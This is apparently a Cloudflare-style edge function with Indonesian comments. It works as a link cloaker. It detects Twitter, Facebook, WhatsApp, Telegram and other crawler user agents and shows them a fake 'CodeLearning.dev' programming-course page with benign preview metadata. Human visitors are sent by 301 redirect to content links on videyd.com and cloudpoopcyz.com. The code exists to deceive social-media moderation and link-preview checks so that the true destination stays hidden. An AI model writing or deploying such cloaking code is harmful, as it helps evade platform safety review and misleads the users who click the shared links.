export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    
    // Debug info
    console.log('🚀 === NEW REQUEST ===');
    console.log('📌 Full URL:', request.url);
    console.log('📌 Path:', path);
    console.log('📌 Host:', request.headers.get('host'));
    
    const userAgent = request.headers.get('user-agent') || '';
    const referer = request.headers.get('referer') || '';
    
    console.log('📌 User-Agent:', userAgent.substring(0, 100));
    console.log('📌 Referer:', referer || 'none');

    // ✅ DETEKSI BOT/TWITTER
    const isFromTwitter = (referer && (referer.includes('t.co') || 
                         referer.includes('twitter.com'))) ||
                         userAgent.includes('Twitterbot') ||
                         request.headers.get('x-twitter-client') !== null;

    const isOtherBot = userAgent.includes('facebookexternalhit') ||
                      userAgent.includes('WhatsApp') ||
                      userAgent.includes('TelegramBot') ||
                      userAgent.includes('Discordbot') ||
                      userAgent.includes('Slackbot') ||
                      userAgent.includes('LinkedInBot') ||
                      /bot|crawler|spider/i.test(userAgent.toLowerCase());

    console.log(`🤖 Bot Detection: Twitter=${isFromTwitter}, OtherBot=${isOtherBot}`);

    // ✅ GENERATE TARGET URL - SELALU PAKAI www
    let targetUrl = '';
    
    if (path.startsWith('/s/')) {
      const rawId = path.substring(3);
      const cleanId = rawId.replace(/[^a-zA-Z0-9-_]/g, '').split('?')[0].split('#')[0] || 'default';
      const contentId = encodeURIComponent(cleanId);
      // ⚡ HARDCODE www.videyd.com - TIDAK ADA VERSI TANPA WWW
      targetUrl = `https://www.videyd.com/e/${contentId}?lv1=videyb.com#_`;
    } else if (path.startsWith('/d/')) {
      const rawId = path.substring(3);
      const cleanId = rawId.replace(/[^a-zA-Z0-9-_]/g, '').split('?')[0].split('#')[0] || 'default';
      const contentId = encodeURIComponent(cleanId);
      targetUrl = `https://cloudpoopcyz.com/d/${contentId}`;
    } else {
      // ⚡ DEFAULT JUGA HARDCODE www
      targetUrl = 'https://www.videyd.com/#_';
    }
    
    console.log(`🎯 Generated Target URL: ${targetUrl}`);
    
    // ✅ JIKA BOT: TAMPILKAN HALAMAN AMAN
    if (isFromTwitter || isOtherBot) {
      console.log('🛡️ Serving safe page to bot');
      return serveSafeTwitterPage(path, targetUrl);
    } 
    // ✅ JIKA HUMAN: REDIRECT 301 LANGSUNG
    else {
      console.log('👤 Redirecting human with 301');
      return new Response(null, {
        status: 301,
        headers: {
          'Location': targetUrl, // Ini sudah PASTI dengan www
          'Cache-Control': 'public, max-age=86400',
          'X-Robots-Tag': 'noindex, nofollow'
        }
      });
    }
  } catch (error) {
    console.error('❌ Error:', error);
    // Fallback tetap dengan www
    return serveSafeTwitterPage('', 'https://www.videyd.com/#_');
  }
}

// ✅ HALAMAN AMAN UNTUK TWITTER/BOT 
function serveSafeTwitterPage(path, targetUrl) {
  const contentId = path.split('/').pop() || 'programming';
  
  // Sanitize
  const sanitize = (str) => {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  };
  
  const safeTopics = {
    'python': 'Learn Python Programming',
    'javascript': 'JavaScript Tutorial for Beginners',
    'webdev': 'Web Development Course',
    'react': 'React.js Crash Course',
    'node': 'Node.js Backend Tutorial',
    'default': 'Learn Programming - Free Coding Courses'
  };
  
  const safeContentId = sanitize(contentId);
  const topic = safeTopics[safeContentId] || safeTopics['default'];
  const safeTopic = sanitize(topic);
  const description = `Free ${safeTopic.toLowerCase()} - Complete guide with examples, exercises, and projects. Start learning today!`;
  const safeTargetUrl = sanitize(targetUrl);
  
  const html = `<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#" lang="en">
<head>
    <meta charset="utf-8">
    <title>${safeTopic} | CodeLearning.dev</title>
    <meta name="description" content="${description}">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="${safeTopic}">
    <meta property="og:description" content="${description}">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://codelearning.dev/${safeContentId}">
    <meta property="og:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop">
    <meta property="og:site_name" content="CodeLearning">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${safeTopic}">
    <meta name="twitter:description" content="${description}">
    <meta name="twitter:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=600&fit=crop">
    <meta name="twitter:site" content="@codelearning">
    
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 15px; padding: 40px; max-width: 600px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.1); }
        h1 { color: #2c5aa0; margin-bottom: 20px; }
        .course-list { margin: 25px 0; text-align: left; }
        .course-item { padding: 12px; border-left: 4px solid #007bff; background: #f8f9fa; margin: 8px 0; border-radius: 0 8px 8px 0; }
        .cta-button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px 40px; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Learn to Code for Free</h1>
        <p>Start your programming journey with our free courses. Perfect for beginners and aspiring developers.</p>
        
        <div class="course-list">
            <div class="course-item"><strong>HTML & CSS</strong> - Build beautiful websites</div>
            <div class="course-item"><strong>JavaScript</strong> - Add interactivity to your sites</div>
            <div class="course-item"><strong>React.js</strong> - Modern frontend framework</div>
            <div class="course-item"><strong>Node.js</strong> - Backend development</div>
        </div>
        
        <button class="cta-button" onclick="startLearning()">▶ Start Learning Now</button>
        
        <p style="color: #999; font-size: 14px; margin-top: 20px;">
            Loading course content...
        </p>
    </div>
    
    <script>
        function startLearning() {
            const button = document.querySelector('.cta-button');
            button.innerHTML = 'Loading...';
            button.disabled = true;
            
            setTimeout(() => {
                const isBot = /bot|crawler|spider|facebookexternalhit|Twitterbot|WhatsApp|Telegram/i.test(navigator.userAgent);
                if (!isBot) {
                    const targetUrl = "${safeTargetUrl}";
                    console.log('Redirecting to:', targetUrl);
                    window.location.href = targetUrl;
                } else {
                    button.innerHTML = '▶ Content Loaded!';
                    button.disabled = false;
                }
            }, 2000);
        }
    </script>
</body>
</html>`;

  return new Response(html, {
    status: 200,
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=7200',
      'X-Robots-Tag': 'index, follow',
      'X-Content-Type-Options': 'nosniff'
    }
  });
}
